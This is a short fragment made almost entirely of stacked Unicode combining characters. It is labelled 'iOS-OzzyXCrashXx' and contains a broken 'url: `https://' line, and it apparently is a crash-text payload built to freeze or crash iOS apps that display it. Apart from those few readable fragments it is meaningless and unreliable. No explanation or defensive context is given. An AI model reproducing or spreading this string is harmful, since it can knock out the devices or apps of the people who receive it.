̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟͜͜ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̢̡̡̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͜͠͠͝͝͠͠ͅͅͅͅͅͅͅͅͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ-O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
      url: `https://̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅ